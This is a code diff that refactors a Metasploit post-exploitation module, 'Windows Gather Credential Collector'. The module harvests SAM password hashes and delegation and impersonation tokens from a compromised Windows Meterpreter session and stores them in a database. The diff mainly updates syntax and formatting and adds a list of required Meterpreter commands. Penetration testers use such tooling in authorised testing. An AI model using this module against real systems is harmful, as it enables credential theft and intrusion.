@@ -1,26 +1,31 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/auxiliary/report'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Credential Collector',
-        'Description'   => %q{ This module harvests credentials found on the host and stores them in the database.},
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'tebo[at]attackresearch.com'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter']
-      ))
-
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Credential Collector',
+        'Description' => %q{ This module harvests credentials found on the host and stores them in the database.},
+        'License' => MSF_LICENSE,
+        'Author' => [ 'tebo[at]attackresearch.com'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_list_tokens
+              priv_passwd_get_sam_hashes
+            ]
+          }
+        }
+      )
+    )
   end
 
   # Run Method for when run command is issued
@@ -96,10 +101,10 @@ class Metasploit3 < Msf::Post
     print_good "Collecting tokens..."
     (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
       data = {}
-      data[:host]      = addr
-      data[:type]      = 'smb_token'
-      data[:data]      = token
-      data[:update]    = :unique_data
+      data[:host] = addr
+      data[:type] = 'smb_token'
+      data[:data] = token
+      data[:update] = :unique_data
 
       print_line "    #{data[:data]}"
       report_note(data) if db_ok
